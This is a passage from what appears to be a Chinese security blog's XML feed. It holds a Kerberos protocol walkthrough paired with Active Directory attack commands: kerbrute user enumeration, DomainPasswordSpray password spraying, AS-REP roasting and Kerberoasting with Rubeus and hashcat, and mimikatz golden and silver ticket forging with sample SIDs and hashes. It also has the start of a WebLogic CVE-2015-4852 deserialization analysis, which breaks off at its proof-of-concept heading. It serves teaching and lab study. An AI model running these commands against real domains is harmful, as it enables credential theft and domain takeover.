src="/images/markdown-img-paste-20211216103131825.png"></li></ul><ol start="2"><li>PA_PAC_REQUEST</li></ol><ul><li>PA-PAC-REQUEST是微软引入的PAC拓展，include-pac=true，KDC会根据include的值来判断返回的票据中是否携带PAC。<br><img src="/images/markdown-img-paste-20211216103013538.png"></li></ul><h3 id="req-body"><a href="#req-body" class="headerlink" title="req-body"></a>req-body</h3><p>req-body中包含以下字段</p><p><img src="/images/markdown-img-paste-20211216104334980.png"></p><ol><li>cname<br>PrincipalName 类型。PrincipalName包含type和value。</li></ol><ul><li>KRB_NT_PRINCIPAL = 1，使用用户名如Administrator</li><li>KRB_NT_PRINCIPAL = 2，一般用服务账户如krbtgt</li><li>KRB_NT_PRINCIPAL = 10，使用用户全程，如：<a href="mailto:&#x41;&#x64;&#x6d;&#105;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#x72;&#64;&#115;&#x65;&#99;&#x2e;&#99;&#111;&#109;">&#x41;&#x64;&#x6d;&#105;&#110;&#105;&#115;&#x74;&#114;&#x61;&#116;&#111;&#x72;&#64;&#115;&#x65;&#99;&#x2e;&#99;&#111;&#109;</a></li></ul><ol start="2"><li>realm<br>域名  </li><li>sname<br>PrincipalName 类型<br>在AS_REQ里面sname是krbtgt，类型是KRB_NT_SRV_INST</li><li>till<br>过期时间</li><li>nonce<br>随机数  </li><li>etype<br>加密类型</li></ol><h2 id="AS-REP"><a href="#AS-REP" class="headerlink" title="AS_REP"></a>AS_REP</h2><p>KDC使用用户 hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，TGT里面包含PAC,PAC包含用户的sid，用户所在的组。</p><p><img src="/images/markdown-img-paste-20211216104904150.png"></p><h3 id="msg-type-1"><a href="#msg-type-1" class="headerlink" title="msg-type"></a>msg-type</h3><p>AS_REQ的响应body对应的就是KRB_AS_REP(0x0b)</p><h3 id="crealm"><a href="#crealm" class="headerlink" title="crealm"></a>crealm</h3><p>域名</p><h3 id="cname"><a href="#cname" class="headerlink" title="cname"></a>cname</h3><p>用户名</p><h3 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h3><p>这个ticket用于TGS_REQ的认证。是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的</p><h3 id="enc-part"><a href="#enc-part" class="headerlink" title="enc_part"></a>enc_part</h3><p>这部分是可以解密的，key是用户hash，解密后得到Encryptionkey，Encryptionkey里面最重要的字段是session key，作为下阶段的认证密钥。</p><p><img src="/images/markdown-img-paste-20211216105601975.png"></p><h1 id="AS-REQ-amp-AS-REP流程中的安全问题"><a href="#AS-REQ-amp-AS-REP流程中的安全问题" class="headerlink" title="AS_REQ &amp; AS_REP流程中的安全问题"></a>AS_REQ &amp; AS_REP流程中的安全问题</h1><h2 id="PTH和PTK"><a href="#PTH和PTK" class="headerlink" title="PTH和PTK"></a>PTH和PTK</h2><p>就是由于在进行认证的时候，是用用户hash加密时间戳，即使在使用密码进行登录的情况下，也是先把密码加密成hash，再进行认证。</p><p>因此在只有用户hash，没有明文密码的情况下也是可以进行认证的。不管是rubeus还是impacket里面的相关脚本都是支持直接使用hash进行认证。</p><ul><li>如果hash的ntlm hash，然后加密方式是rc4，这种就算做是pass the hash</li><li>如果是hash是aes key(使用sekurlsa::ekeys导出来)，就算是pass the key。</li></ul><p>在很多地方，不支持rc4加密方式的时候，使用pass the key不失为一种好方法。</p><h2 id="用户名枚举"><a href="#用户名枚举" class="headerlink" title="用户名枚举"></a>用户名枚举</h2><p>当用户名错误的时候，会报以下错误<br><img src="/images/markdown-img-paste-20211216112025305.png"></p><p>在没有域账户的情况下，我们可以使用脚本更改cname的值来进行用户名枚举，获得存在的账户名<br>PS：在机器上获得system权限时，此时机器也是域账户，账户名为机器名+$</p><h3 id="使用kerbrute进行用户名枚举"><a href="#使用kerbrute进行用户名枚举" class="headerlink" title="使用kerbrute进行用户名枚举"></a>使用kerbrute进行用户名枚举</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#域内<br>kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> userenum -d sec<span class="hljs-selector-class">.com</span> user<span class="hljs-selector-class">.txt</span><br>#域外<br>kerbrute_windows_amd64<span class="hljs-selector-class">.exe</span> userenum --dc dc-ip -d sec<span class="hljs-selector-class">.com</span> user.txt<br></code></pre></td></tr></table></figure><p><img src="/images/markdown-img-paste-20211216145534273.png"></p><h2 id="Password-Spraying（密码喷洒）"><a href="#Password-Spraying（密码喷洒）" class="headerlink" title="Password Spraying（密码喷洒）"></a>Password Spraying（密码喷洒）</h2><p>在账户名正确的时候，可以尝试爆破密码</p><p>密码正确：<br><img src="/images/markdown-img-paste-20211216112516523.png"></p><p>密码错误：<br><img src="/images/markdown-img-paste-20211216112542778.png"></p><p>因此我们可以通过返回码的不同来爆破用户密码</p><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>密码喷射是所谓的蛮力攻击的一种变体。在传统的蛮力攻击中，犯罪者试图通过在很短的时间内反复猜测密码来未经授权访问单个帐户。大多数组织都采用了对策，通常在三到五次尝试后锁定。在密码喷射攻击中，攻击者通过在尝试另一个密码之前在多个帐户之间“喷射”相同的密码来规避常见的对策（例如，帐户锁定）。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名。</p><p>在实战中，我们常常会用到<a href="https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/master/DomainPasswordSpray.ps1">DomainPasswordSpray</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Import</span>-Module .\DomainPasswordSpray.ps1<br>#爆破单密码，自动取域用户列表<br>Invoke-DomainPasswordSpray -<span class="hljs-keyword">Password</span> Aa123.com<br>#根据users.txt和passlist.txt爆破<br>Invoke-DomainPasswordSpray -UserList users.txt -<span class="hljs-keyword">Domain</span> <span class="hljs-keyword">domain</span>-<span class="hljs-type">name</span> -PasswordList passlist.txt -OutFile sprayed-creds.txt<br>#获取域用户列表<br><span class="hljs-keyword">Get</span>-DomainUserList -<span class="hljs-keyword">Domain</span> domainname -RemoveDisabled -RemovePotentialLockouts | <span class="hljs-keyword">Out</span>-File -<span class="hljs-keyword">Encoding</span> ascii userlist.txt<br></code></pre></td></tr></table></figure><p><img src="/images/markdown-img-paste-2021121613393222.png"></p><h2 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h2><p>AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “ 。而该属性默认是没有勾选上的。</p><p>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。关于 AS_REQ &amp; AS_REP：域内认证之Kerberos协议详解。  </p><p>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。</p><p>设置不需要kerberos预身份验证</p><p><img src="/images/markdown-img-paste-20211216135328857.png"></p><h3 id="使用Rubeus进行AS-REPRoasting"><a href="#使用Rubeus进行AS-REPRoasting" class="headerlink" title="使用Rubeus进行AS-REPRoasting"></a>使用Rubeus进行AS-REPRoasting</h3><p>Rubeus中存在AS-REPRoasting功能，会通过LDAP查询域内用户设置了选项”Do not require Kerberos preauthentication”，然后发AS_REQ的包，直接生成hash或者john可破解的格式</p><ol><li>获取hash</li></ol><p>以域账户或者机器账户运行<br><code>Rubeus.exe asreproast /nowrap /format:hashcat</code></p><p><img src="/images/markdown-img-paste-20211216141707337.png"></p><ol start="2"><li>爆破</li></ol><p>使用hashcat进行爆破：<code>hashcat -m 18200 hash.txt pass.txt --force</code></p><p><img src="/images/markdown-img-paste-20211216140329337.png"></p><h3 id="使用powerview获取开启了Do-not-require-Kerberos-preauthentication选项用户的模块"><a href="#使用powerview获取开启了Do-not-require-Kerberos-preauthentication选项用户的模块" class="headerlink" title="使用powerview获取开启了Do not require Kerberos preauthentication选项用户的模块"></a>使用powerview获取开启了Do not require Kerberos preauthentication选项用户的模块</h3><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-built_in">Import</span><span class="hljs-operator">-</span><span class="hljs-built_in">Module</span> <span class="hljs-operator">.</span>\<span class="hljs-variable">PowerView</span><span class="hljs-operator">.</span><span class="hljs-variable">ps1</span><br><span class="hljs-built_in">Get</span><span class="hljs-operator">-</span><span class="hljs-variable">DomainUser</span> <span class="hljs-operator">-</span><span class="hljs-variable">PreauthNotRequired</span> <span class="hljs-operator">-</span><span class="hljs-built_in">Verbose</span><br></code></pre></td></tr></table></figure><p><img src="/images/markdown-img-paste-20211216140700729.png"></p><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p>在AS_REP里面的ticket的encpart是使用krbtgt的hash进行加密的，如果我们拥有krbtgt的hash，就可以给我们自己签发任意用户的TGT票据，这个票据也被称为黄金票据。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><ol><li>需要与DC通信(不需要与AS进行交互,需要与TGS)</li><li>需要krbtgt用户的hash</li></ol><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ol><li>域名称</li><li>域的SID值</li><li>域的KRBTGT账户密码HASH</li><li>伪造用户名，可以是任意的(TGT使用期限20分钟之内，域控制器KDC服务不会验证TGT中的用户账户)</li></ol><h3 id="制作"><a href="#制作" class="headerlink" title="制作"></a>制作</h3><p>使用mimikatz制作黄金票据<br><code>mimikatz.exe &quot;kerberos::golden /domain:sec.com /sid:S-1-5-21-2034009618-3541114061-2016816010 /user:administrator /krbtgt:762cfa8fabf64a440af852bb497043b1 /ticket:k0u.kiribi&quot; exit</code></p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>清除票据缓存：<code>klist purge</code></p><p><img src="/images/markdown-img-paste-20211216144353605.png"></p><p>访问域控：<code>dir \\dc2019.sec.com</code></p><p><img src="/images/markdown-img-paste-20211216144425315.png"></p><p>注入票据：<code>mimikatz.exe &quot;kerberos::ptt ./k0u.kiribi&quot; exit</code></p><p><img src="/images/markdown-img-paste-20211216144531752.png"></p><p>再次访问：<code>dir \\dc2019.sec.com</code></p><p><img src="/images/markdown-img-paste-20211216144603624.png"></p><h1 id="TGS-REQ-amp-TGS-REP"><a href="#TGS-REQ-amp-TGS-REP" class="headerlink" title="TGS_REQ &amp; TGS_REP"></a>TGS_REQ &amp; TGS_REP</h1><p>在AS_REP中，kdc返回了使用krbtgt hash加密的tgt票据。在TGS_REQ &amp; TGS_REP阶段，用户通过AS_REP拿到的TGT票据，去向KDC申请特定服务的访问权限，KDC校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。</p><p>这一阶段，微软引进了两个扩展S4U2SELF和S4U2PROXY。</p><h2 id="TGS-REQ"><a href="#TGS-REQ" class="headerlink" title="TGS_REQ"></a>TGS_REQ</h2><p>在TGS_REQ阶段是不需要账户密码的，需要的只是AS_REP返回的TGT</p><p>导入TGT模拟发包<br><img src="/images/markdown-img-paste-20211216151128125.png"></p><p>wireshark截获流量<br><img src="/images/markdown-img-paste-20211217102435692.png"></p><h3 id="msg-type-2"><a href="#msg-type-2" class="headerlink" title="msg-type"></a>msg-type</h3><p>类型，TGS_REQ对应的就是KRB_TGS_REQ(0x0c)</p><h3 id="PA-DATA-1"><a href="#PA-DATA-1" class="headerlink" title="PA-DATA"></a>PA-DATA</h3><p>正常的TGS_REQ的请求需要用到有，TGS_REQ必须携带的部分，这部分会携带AS_REP里面获取到的TGT票据</p><p>KDC校验TGT票据，如果票据正确，就返回TGS票据。</p><ul><li>PA_FOR_USER<br>类型是S4U2SELF</li></ul><p>值是一个唯一的标识符，该标识符指示用户的身份。该唯一标识符由用户名和域名组成。</p><p>S4U2proxy 必须扩展PA_FOR_USER结构，指定服务代表某个用户(图片里面是administrator)去请求针对服务自身的kerberos服务票据。</p><ul><li>PA_PAC_OPTIONS</li></ul><p>类型是 PA_PAC_OPTIONS</p><p>值是以下flag的组合</p><ul><li>Claims(0)</li><li>Branch Aware(1)</li><li>Forward to Full DC(2)</li><li>Resource-based Constrained Delegation (3)<br>微软的MS-SFU 2.2.5， S4U2proxy 必须扩展PA-PAC-OPTIONS结构。<br>如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。</li></ul><h3 id="REQ-BODY"><a href="#REQ-BODY" class="headerlink" title="REQ_BODY"></a>REQ_BODY</h3><ul><li>sname</li></ul><p>这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。</p><ul><li>AddtionTicket</li></ul><p>附加票据，在S4U2proxy请求里面，既需要正常的TGT，也需要S4U2self阶段获取到的TGS，那么这个TGS就添加到AddtionTicket里面。</p><h2 id="TGS-REP"><a href="#TGS-REP" class="headerlink" title="TGS_REP"></a>TGS_REP</h2><p><img src="/images/markdown-img-paste-20211217142412198.png"></p><h3 id="msg-type-3"><a href="#msg-type-3" class="headerlink" title="msg-type"></a>msg-type</h3><p>AS_REQ的响应body对应的就是KRB_TGS_REQ(0x0d)</p><h3 id="ticket-1"><a href="#ticket-1" class="headerlink" title="ticket"></a>ticket</h3><p>这个ticket用于AP_REQ的认证。其中里面的enc_part是加密的，用户不可读取里面的内容。在AS_REQ请求里面是，是使用krbtgt的hash进行加密的，而在TGS_REQ里面是使用要请求的服务的hash加密的。因此如果我们拥有服务的hash就可以自己制作一个ticket，既白银票据。</p><h3 id="enc-part-1"><a href="#enc-part-1" class="headerlink" title="enc_part"></a>enc_part</h3><p>这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的 session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。</p><h1 id="TGS-REQ-amp-TGS-REP流程中的安全问题"><a href="#TGS-REQ-amp-TGS-REP流程中的安全问题" class="headerlink" title="TGS_REQ &amp; TGS_REP流程中的安全问题"></a>TGS_REQ &amp; TGS_REP流程中的安全问题</h1><h2 id="pass-the-ticket"><a href="#pass-the-ticket" class="headerlink" title="pass the ticket"></a>pass the ticket</h2><p>Kerbreos 除了第一步AS_ERQ是使用时间戳加密用户hash验证之外，其他的步骤的验证都是通过票据，这个票据 可以是TGT票据或者TGS票据。因为票据里面的内容主要是session_key和ticket(使用服务hash加密的，服务包括krbtgt)，拿到票据之后。我们就可以用这个票据来作为下阶段的验证了。</p><h2 id="kerberosting"><a href="#kerberosting" class="headerlink" title="kerberosting"></a>kerberosting</h2><p>TGS_REQ &amp; TGS_REP过程中，只要用户提供的票据正确，TGS就会返回服务hash加密的tgs票据，同时，任意一个域用户就可以申请服务的tgs票据</p><p>如果我们申请服务的票据，再在本地爆破服务hash得到服务密码，这个过程叫做Kerberoasting。</p><p>而在域中，服务通过spn来作为唯一标识</p><h3 id="域内账户"><a href="#域内账户" class="headerlink" title="域内账户"></a>域内账户</h3><p>主机账号的口令由系统随机设置，几乎不能破解，而且每30天自动变更一次用户账号的口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大。<br>服务账号的口令存在很大的特殊性，口令在应用软件安装时往往自动设定，复杂度往往较为简单口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行MS SQL Server 服务的sqlsvc账号等<br>SPN存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有SPN服务。因为主机账号的口 令几乎不能破解，所以只查询用户账号的SPN。</p><h3 id="SPN简介"><a href="#SPN简介" class="headerlink" title="SPN简介"></a>SPN简介</h3><p>SPN是服务器上所运行服务的唯一标识，每个使用Kerberos的服务都需要一个SPN</p><p>SPN分为两种，一种注册在AD上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下</p><p>当一个服务的权限为Local System或Network Service，则SPN注册在机器帐户(Computers)下</p><p>当一个服务的权限为一个域用户，则SPN注册在域用户帐户(Users)下</p><h3 id="SPN查找"><a href="#SPN查找" class="headerlink" title="SPN查找"></a>SPN查找</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">setspn.exe <span class="hljs-literal">-q</span> \*/*<br><span class="hljs-comment">#powerview.ps1</span><br><span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-spn</span>|<span class="hljs-built_in">Select</span> name,serviceprincipalname<br></code></pre></td></tr></table></figure><h3 id="SPN注册"><a href="#SPN注册" class="headerlink" title="SPN注册"></a>SPN注册</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">#机器账户注册<br>setspn<span class="hljs-selector-class">.exe</span> -S spnforPC/testAccount<span class="hljs-selector-class">.sec</span><span class="hljs-selector-class">.com</span> testAccount$<br>#用户组测<br>setspn -U -A spnforuser/win10<span class="hljs-selector-class">.sec</span><span class="hljs-selector-class">.com</span> test<br></code></pre></td></tr></table></figure><h3 id="SPN删除"><a href="#SPN删除" class="headerlink" title="SPN删除"></a>SPN删除</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">setspn<span class="hljs-selector-class">.exe</span> -D testuser/win10<span class="hljs-selector-class">.sec</span><span class="hljs-selector-class">.com</span> test<br></code></pre></td></tr></table></figure><h3 id="kerberosting利用"><a href="#kerberosting利用" class="headerlink" title="kerberosting利用"></a>kerberosting利用</h3><p>获取TGS</p><ul><li>Invoke-Kerberoast.ps1</li></ul><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#所有用户</span><br>- <span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br> <span class="hljs-literal">-OutputFormat</span> Hashcat | <span class="hljs-built_in">Select</span> hash | <span class="hljs-built_in">ConvertTo-CSV</span> <span class="hljs-literal">-NoTypeInformation</span><br><span class="hljs-comment">#高权限用户</span><br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-AdminCount</span> <span class="hljs-literal">-OutputFormat</span> Hashcat | <span class="hljs-built_in">Select</span> hash | <span class="hljs-built_in">ConvertTo-CSV</span> <span class="hljs-literal">-NoTypeInformation</span><br></code></pre></td></tr></table></figure><p><img src="/images/markdown-img-paste-20211217172850773.png"></p><ul><li>Rubeus.exe</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Rubeus</span>.</span></span>exe Kerberoast<br></code></pre></td></tr></table></figure><p><img src="/images/markdown-img-paste-20211217174152517.png"></p><p>爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">hashcat -m <span class="hljs-number">13100</span> <span class="hljs-built_in">hash</span>.txt <span class="hljs-keyword">pass</span>.txt --force<br></code></pre></td></tr></table></figure><p><img src="/images/markdown-img-paste-20211217174229347.png"></p><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>在TGS_REP里面的ticket的encpart是使用服务的hash进行加密的，如果我们拥有服务的hash，就可以给我们自己签发任意用户的TGS票据，这个票据也被称为白银票据。</p><p>相较于黄金票据，白银票据使用要访问服务的hash，而不是krbtgt的hash，由于生成的是tgs票据，不需要跟域控打交道，但是白银票票据只能访问特定服务。但是要注意的一点是，伪造的白银票据没有带有有效KDC签名的PAC。如果将目标主机配置为验证KDC PAC签名(关于PAC的详细信息，将在下一篇文章里面详细介绍)，则银票将不起作用。</p><h3 id="必要条件"><a href="#必要条件" class="headerlink" title="必要条件"></a>必要条件</h3><ol><li>域名称</li><li>域的SID值</li><li>域中的Server服务器账户的NTLM-Hash</li><li>伪造的用户名，可以是任意用户名.</li><li>目标服务器上面的kerberos服务</li></ol><h3 id="服务列表"><a href="#服务列表" class="headerlink" title="服务列表"></a>服务列表</h3><table><thead><tr><th>服务名称</th><th>同时需要的服务</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share</td><td>CIFS</td></tr><tr><td>LDAP</td><td>LDAP</td></tr><tr><td>Windows Remote Server</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>使用mimikatz</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">mimikatz <span class="hljs-string">&quot;kerberos::golden /domain:&lt;域名&gt; /sid:&lt;域 SID&gt; /target:&lt;目标服务器的FQDN&gt; /service:&lt;服务类型&gt; /rc4:&lt;NTLMHash&gt; /user:&lt;伪造的用户名&gt; /ptt&quot;</span> <span class="hljs-keyword">exit</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:sec.com /sid:S-1-5-21-2034009618-3541114061-2016816010 /target:win7 /service:cifs /rc4:64bb5d1979610b708d8191e189ab922e /user:Administrator /ptt&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure><p>访问目标共享目录<br><img src="/images/markdown-img-paste-20211217184105621.png"></p><h1 id="PAC-amp-MS14-068"><a href="#PAC-amp-MS14-068" class="headerlink" title="PAC &amp; MS14-068"></a>PAC &amp; MS14-068</h1>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic CVE-2015-4852 反序列化漏洞分析</title>
    <link href="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>本文主要讲述以下内容</p><ul><li>环境搭建</li><li>T3协议</li><li>CVE-2015-4852漏洞分析</li></ul><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="镜像搭建"><a href="#镜像搭建" class="headerlink" title="镜像搭建"></a>镜像搭建</h2><p>这里采用QAX-A-Team的脚本来搭建环境</p><p>地址：<code>https://github.com/QAX-A-Team/WeblogicEnvironment.git</code></p><p>JDK安装包下载地址：<a href="https://www.oracle.com/technetwork/java/javase/archive-139210.html">https://www.oracle.com/technetwork/java/javase/archive-139210.html</a></p><p>Weblogic安装包下载地址：<a href="https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html">https://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</a></p><p>这里我选择的环境是weblogic10.3.6+jdk-7u21</p><p>启动命令：<code>./run_weblogic1036jdk7u21.sh</code></p><h2 id="远程试调"><a href="#远程试调" class="headerlink" title="远程试调"></a>远程试调</h2><p>启动脚本会自动复制modules 和 wlserver，但没有复制coherence_3.7，将其复制出来</p><p><code>docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</code></p><p>IDEA打开wlserver</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20211208171311383.png"></p><p>添加modules和coherence_3.7的依赖</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-2021120817200489.png"></p><p>将server/lib 添加为库</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-2021120817204902.png"></p><p>编辑配置</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20211208174246537.png"></p><p>出现如下提示，证明环境搭建成功</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20211208174319179.png"></p><p>搜索WLSServletAdapter，在129打下断点</p><p>访问 <a href="http://192.168.75.128:7001/wls-wsat/CoordinatorPortType">http://192.168.75.128:7001/wls-wsat/CoordinatorPortType</a></p><p>成功拦截请求</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20211208174611291.png"></p><p>环境搭建成功</p><h1 id="T3协议"><a href="#T3协议" class="headerlink" title="T3协议"></a>T3协议</h1><p>WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。同时T3协议包括</p><p>1、请求包头<br>2、请求主体</p><p>因此构造T3数据包时，需要发送两次数据</p><h2 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h2><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220314111321262.png"></p><p>请求头</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">t3</span> <span class="hljs-number">10</span>.<span class="hljs-number">3</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">AS</span>:<span class="hljs-number">255</span><br><span class="hljs-attribute">HL</span>:<span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><p>weblogic返回数据</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">HELO:</span><span class="hljs-number">10.3</span>.<span class="hljs-number">6.0</span>.<span class="hljs-literal">false</span><br><span class="hljs-symbol">AS:</span><span class="hljs-number">2048</span><br><span class="hljs-symbol">HL:</span><span class="hljs-number">19</span><br></code></pre></td></tr></table></figure><p>我们可以通过发送请求头来探测目标weblogic的版本</p><h2 id="T3数据构造"><a href="#T3数据构造" class="headerlink" title="T3数据构造"></a>T3数据构造</h2><p>第一种：将weblogic发送的java序列化数据的地2到第7部分的反序列化数据进行替换</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220314112317822.png"></p><p>第二种：将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。也就是替换第一部分的数据</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220314112326923.png"></p><p>在数据包中的体现</p><p><img src="/2021/12/08/Weblogic%20CVE-2015-4852%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/markdown-img-paste-20220314112245612.png"></p><h1 id="CVE-2015-4852分析"><a href="#CVE-2015-4852分析" class="headerlink" title="CVE-2015-4852分析"></a>CVE-2015-4852分析</h1><h2 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h2><ul><li>10.3.6.0</li><li>12.1.2.0</li><li>12.1.3.0</li><li>12.2.1.0</li></ul><h2 id="POC代码"><a 